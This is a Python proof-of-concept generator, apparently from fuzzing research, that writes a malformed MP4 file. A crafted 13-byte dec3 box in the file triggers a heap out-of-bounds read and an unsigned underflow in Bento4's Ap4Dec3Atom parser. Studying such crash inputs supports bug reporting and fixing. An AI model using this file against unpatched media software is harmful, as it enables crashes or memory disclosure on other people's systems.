#!/usr/bin/env python3
"""
vuln_001_gen.py - PoC generator for VULN 001
Heap OOB Read in AP4_Dec3Atom::AP4_Dec3Atom()
File: Bento4/Source/C++/Core/Ap4Dec3Atom.cpp, lines 96-97

Trigger trace:
  payload_size = size - 8 = 13 - 8 = 5 bytes
  Parse EC3 header: payload[0..1] consumed, payload += 2, payload_size = 3
  Loop i=0: payload_size==3, NOT < 3, so proceed into parsing
    Read payload[0],[1],[2]  (valid)
    num_dep_sub = (payload[2]>>1) & 0xF
    If num_dep_sub != 0: READ payload[3]  <<< OOB: 1 byte past end of 3-byte slice
    payload_size -= 4  =>  3 - 4 = 0xFFFFFFFF (unsigned underflow)
"""

import struct
import os
import sys

POC_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Dec3Atom_cpp"
OUTPUT_FILE = os.path.join(POC_DIR, "vuln_001.mp4")


def make_box(box_type, data):
    """Return a standard MP4 box: 4-byte BE size + 4-byte type + data."""
    assert len(box_type) == 4
    size = 8 + len(data)
    return struct.pack(">I", size) + box_type + data


def make_fullbox(box_type, version, flags, data):
    """Return a FullBox: standard header + version(1B)+flags(3B) + data."""
    vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return make_box(box_type, vf + data)


# ---------------------------------------------------------------------------
# dec3 box  (EC3SpecificBox)  -- MUST be exactly 13 bytes
#   8-byte header:  [size=13][type='dec3']
#   5-byte payload: [B0][B1][B2][B3][B4]
#
# Parsing in AP4_Dec3Atom::AP4_Dec3Atom():
#   m_DataRate = (B0<<5)|(B1>>3)
#   num_ind_sub = B1 & 7 = 0  ->  substream_count = 1
#   payload += 2; payload_size -= 2;  => payload now = [B2,B3,B4], size=3
#
#   Loop i=0:
#     payload_size(3) < 3?  NO  -> enter parsing
#     fscod = (B2>>6)&3, bsid = (B2>>1)&0x1F, bsmod = (B2<<4|B3>>4)&0x1F
#     acmod = (B3>>1)&7, lfeon = B3&1
#     num_dep_sub = (B4>>1)&0xF
#     Set B4 = 0x0E:  num_dep_sub = (0x0E>>1)&0xF = 7  (nonzero!)
#       -> READS payload[3]  <-- 1 byte PAST END of the 3-byte slice (OOB!)
#       -> payload_size -= 4  => 3-4 = 0xFFFFFFFF (unsigned underflow)
# ---------------------------------------------------------------------------

dec3_payload = bytes([
    0x00,   # B0: data_rate[12:5] = 0
    0x00,   # B1: data_rate[4:0]=0, num_ind_sub=0  -> 1 substream
    0x00,   # B2: fscod=0, bsid=0, bsmod_msb=0
    0x00,   # B3: bsmod remaining=0, acmod=0, lfeon=0
    0x0E,   # B4: num_dep_sub=(0x0E>>1)&0xF=7 -> nonzero -> OOB read!
])
assert len(dec3_payload) == 5

dec3_box = struct.pack(">I", 13) + b'dec3' + dec3_payload
assert len(dec3_box) == 13

# ---------------------------------------------------------------------------
# ec-3 AudioSampleEntry box
#   6B reserved | 2B data_ref_idx | 8B reserved | 2B channelcount |
#   2B samplesize | 2B pre_defined | 2B reserved | 4B samplerate(16.16)
#   [child: dec3 box]
# ---------------------------------------------------------------------------
ec3_audio_entry = (
    b'\x00' * 6 +                           # 6 bytes reserved
    struct.pack(">H", 1) +                  # data_reference_index = 1
    b'\x00' * 8 +                           # 8 bytes reserved
    struct.pack(">H", 2) +                  # channelcount = 2
    struct.pack(">H", 16) +                 # samplesize = 16
    struct.pack(">H", 0) +                  # pre_defined = 0
    struct.pack(">H", 0) +                  # reserved = 0
    struct.pack(">I", 44100 << 16) +        # samplerate = 44100.0 (16.16 fixed)
    dec3_box                                # EC3SpecificBox child
)
ec3_box = make_box(b'ec-3', ec3_audio_entry)
assert len(ec3_box) == 8 + 28 + 13   # 49

# ---------------------------------------------------------------------------
# stsd (SampleDescriptionBox) - FullBox
# ---------------------------------------------------------------------------
stsd_box = make_fullbox(b'stsd', 0, 0,
    struct.pack(">I", 1) +      # entry_count = 1
    ec3_box
)
assert len(stsd_box) == 65

# ---------------------------------------------------------------------------
# Other sample table boxes (empty / minimal)
# ---------------------------------------------------------------------------
stts_box = make_fullbox(b'stts', 0, 0, struct.pack(">I", 0))   # entry_count=0
stsc_box = make_fullbox(b'stsc', 0, 0, struct.pack(">I", 0))   # entry_count=0
stsz_box = make_fullbox(b'stsz', 0, 0, struct.pack(">II", 0, 0))  # sample_size=0, count=0
stco_box = make_fullbox(b'stco', 0, 0, struct.pack(">I", 0))   # entry_count=0

assert len(stts_box) == 16
assert len(stsc_box) == 16
assert len(stsz_box) == 20
assert len(stco_box) == 16

# ---------------------------------------------------------------------------
# stbl (SampleTableBox)
# ---------------------------------------------------------------------------
stbl_box = make_box(b'stbl',
    stsd_box + stts_box + stsc_box + stsz_box + stco_box
)
assert len(stbl_box) == 141

# ---------------------------------------------------------------------------
# smhd (SoundMediaHeaderBox)
# ---------------------------------------------------------------------------
smhd_box = make_fullbox(b'smhd', 0, 0,
    struct.pack(">HH", 0, 0)    # balance=0, reserved=0
)
assert len(smhd_box) == 16

# ---------------------------------------------------------------------------
# dinf > dref > url
# ---------------------------------------------------------------------------
url_box = make_fullbox(b'url ', 0, 1, b'')  # flags=1 = self-contained
assert len(url_box) == 12

dref_box = make_fullbox(b'dref', 0, 0,
    struct.pack(">I", 1) +      # entry_count = 1
    url_box
)
assert len(dref_box) == 28

dinf_box = make_box(b'dinf', dref_box)
assert len(dinf_box) == 36

# ---------------------------------------------------------------------------
# minf (MediaInformationBox)
# ---------------------------------------------------------------------------
minf_box = make_box(b'minf',
    smhd_box + dinf_box + stbl_box
)
assert len(minf_box) == 201

# ---------------------------------------------------------------------------
# mdhd (MediaHeaderBox) - version 0
# ---------------------------------------------------------------------------
mdhd_data = (
    struct.pack(">I", 0) +          # creation_time
    struct.pack(">I", 0) +          # modification_time
    struct.pack(">I", 44100) +      # timescale
    struct.pack(">I", 0) +          # duration
    struct.pack(">HH", 0x55C4, 0)   # language='und', pre_defined=0
)
mdhd_box = make_fullbox(b'mdhd', 0, 0, mdhd_data)
assert len(mdhd_box) == 32

# ---------------------------------------------------------------------------
# hdlr (HandlerBox)
# ---------------------------------------------------------------------------
hdlr_data = (
    struct.pack(">I", 0) +          # pre_defined
    b'soun' +                       # handler_type = Sound
    b'\x00' * 12 +                  # reserved
    b'\x00'                         # name: empty null-terminated string
)
hdlr_box = make_fullbox(b'hdlr', 0, 0, hdlr_data)
assert len(hdlr_box) == 33

# ---------------------------------------------------------------------------
# mdia (MediaBox)
# ---------------------------------------------------------------------------
mdia_box = make_box(b'mdia',
    mdhd_box + hdlr_box + minf_box
)
assert len(mdia_box) == 274

# ---------------------------------------------------------------------------
# tkhd (TrackHeaderBox) - version 0
# Unity matrix: [0x10000, 0, 0, 0, 0x10000, 0, 0, 0, 0x40000000]
# ---------------------------------------------------------------------------
unity_matrix = struct.pack(">9i",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)

tkhd_data = (
    struct.pack(">I", 0) +          # creation_time
    struct.pack(">I", 0) +          # modification_time
    struct.pack(">I", 1) +          # track_id = 1
    struct.pack(">I", 0) +          # reserved
    struct.pack(">I", 0) +          # duration
    b'\x00' * 8 +                   # reserved
    struct.pack(">HH", 0, 0) +      # layer=0, alternate_group=0
    struct.pack(">H", 0x0100) +     # volume = 1.0 (8.8 fixed)
    struct.pack(">H", 0) +          # reserved
    unity_matrix +                  # matrix (36 bytes)
    struct.pack(">II", 0, 0)        # width=0, height=0
)
tkhd_box = make_fullbox(b'tkhd', 0, 3, tkhd_data)   # flags=3: enabled+in_movie
assert len(tkhd_box) == 92

# ---------------------------------------------------------------------------
# trak (TrackBox)
# ---------------------------------------------------------------------------
trak_box = make_box(b'trak', tkhd_box + mdia_box)
assert len(trak_box) == 374

# ---------------------------------------------------------------------------
# mvhd (MovieHeaderBox) - version 0
# ---------------------------------------------------------------------------
mvhd_data = (
    struct.pack(">I", 0) +              # creation_time
    struct.pack(">I", 0) +              # modification_time
    struct.pack(">I", 1000) +           # timescale
    struct.pack(">I", 0) +              # duration
    struct.pack(">I", 0x00010000) +     # rate = 1.0 (16.16 fixed)
    struct.pack(">H", 0x0100) +         # volume = 1.0 (8.8 fixed)
    b'\x00' * 10 +                      # reserved (2 + 8 bytes)
    unity_matrix +                      # matrix (36 bytes)
    b'\x00' * 24 +                      # pre_defined (6 x 4 bytes)
    struct.pack(">I", 2)                # next_track_id = 2
)
mvhd_box = make_fullbox(b'mvhd', 0, 0, mvhd_data)
assert len(mvhd_box) == 108

# ---------------------------------------------------------------------------
# moov (MovieBox)
# ---------------------------------------------------------------------------
moov_box = make_box(b'moov', mvhd_box + trak_box)
assert len(moov_box) == 490

# ---------------------------------------------------------------------------
# ftyp (FileTypeBox)
# ---------------------------------------------------------------------------
ftyp_box = make_box(b'ftyp',
    b'mp42' +                           # major_brand
    struct.pack(">I", 0) +              # minor_version
    b'mp42' + b'isom'                   # compatible_brands
)
assert len(ftyp_box) == 24

# ---------------------------------------------------------------------------
# mdat (minimal empty MediaDataBox)
# ---------------------------------------------------------------------------
mdat_box = struct.pack(">I", 8) + b'mdat'
assert len(mdat_box) == 8

# ---------------------------------------------------------------------------
# Assemble the MP4 file
# ---------------------------------------------------------------------------
mp4_data = ftyp_box + moov_box + mdat_box

os.makedirs(POC_DIR, exist_ok=True)
with open(OUTPUT_FILE, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_FILE}")
print(f"[+] dec3 box payload (hex): {dec3_payload.hex()}")
print(f"[+] Trigger: payload[4]=0x0E -> num_dep_sub=(0x0E>>1)&0xF=7")
print(f"[+] OOB read: payload[3] at offset 3 past 3-byte substream slice")
print(f"[+] Unsigned underflow: payload_size 3-4 = 0xFFFFFFFF")
